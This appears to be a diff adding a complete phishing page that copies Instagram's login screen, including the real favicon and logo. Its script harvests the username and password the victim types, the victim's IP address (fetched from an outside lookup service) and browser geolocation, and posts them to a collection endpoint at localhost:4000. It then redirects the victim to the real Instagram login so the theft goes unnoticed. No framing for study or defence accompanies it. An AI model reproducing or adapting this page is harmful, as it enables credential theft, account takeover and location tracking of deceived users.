@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #fafafa;
+      color: #262626;
+      min-height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .card {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      padding: 40px;
+      width: 100%;
+      max-width: 360px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+      text-align: center;
+    }
+
+    .logo img {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      color: #262626;
+      font-size: 14px;
+    }
+
+    .password-wrapper {
+      position: relative;
+    }
+
+    #togglePassword {
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 14px;
+      color: #888;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-btn:active {
+      background-color: #031827; /* Darker when pressed */
+    }
+
+    .divider {
+      text-align: center;
+      color: #999;
+      margin: 20px 0;
+      font-size: 14px;
+      position: relative;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .divider::before {
+      left: 0;
+    }
+
+    .divider::after {
+      right: 0;
+    }
+
+    .fb-login {
+      background: none;
+      border: none;
+      color: #385185;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    .forgot {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 20px;
+    }
+
+    .forgot a {
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .signup-box {
+      margin-top: 20px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      padding: 20px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .footer {
+      margin-top: 30px;
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+    }
+
+    .footer a {
+      color: #999;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="logo">
+        <!-- Official Instagram logo with transparent background -->
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram logo" />
+      </div>
+      <input type="text" id="egInputEmail" placeholder="Phone number, username, or email" autocomplete="username" />
+      <div class="password-wrapper">
+        <input type="password" id="Inputpassword" placeholder="Password" autocomplete="current-password" />
+        <span id="togglePassword">👁️</span>
+      </div>
+      <button class="login-btn" onclick="getInput(this)">Log In</button>
+      <div class="divider">OR</div>
+      <button class="fb-login">Log in with Facebook</button>
+      <div class="forgot">
+        <a href="#">Forgot password?</a>
+      </div>
+    </div>
+
+    <div class="signup-box">
+      Don’t have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="footer">
+      <p>
+        <a href="#">Meta</a> · 
+        <a href="#">About</a> · 
+        <a href="#">Blog</a> · 
+        <a href="#">Jobs</a> · 
+        <a href="#">Help</a>
+      </p>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const passwordInput = document.getElementById("Inputpassword");
+      const togglePassword = document.getElementById("togglePassword");
+
+      togglePassword.addEventListener("click", () => {
+        const isPassword = passwordInput.type === "password";
+        passwordInput.type = isPassword ? "text" : "password";
+        togglePassword.textContent = isPassword ? "🙈" : "👁️";
+      });
+    });
+
+    async function getInput(button) {
+      const email = document.getElementById("egInputEmail").value.trim();
+      const password = document.getElementById("Inputpassword").value.trim();
+
+      if (!email || !password) {
+        alert("Please enter both email and password.");
+        return;
+      }
+
+      button.textContent = "Logging in...";
+      button.disabled = true;
+
+      let ip = "Unavailable";
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch (e) {
+        console.warn("IP fetch failed:", e);
+      }
+
+      const sendData = async (lat, lng) => {
+        try {
+          await fetch("http://localhost:4000/send-login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              email,
+              password,
+              ip,
+              lat,
+              lng,
+              time: new Date().toISOString()
+            })
+          });
+        } catch (error) {
+          console.error("Error sending data:", error);
+        } finally {
+          window.location.href = "https://www.instagram.com/accounts/login/";
+        }
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => sendData(pos.coords.latitude, pos.coords.longitude),
+          () => sendData(null, null)
+        );
+      } else {
+        sendData(null, null);
+      }
+    }
+  </script>
+</body>
+</html>
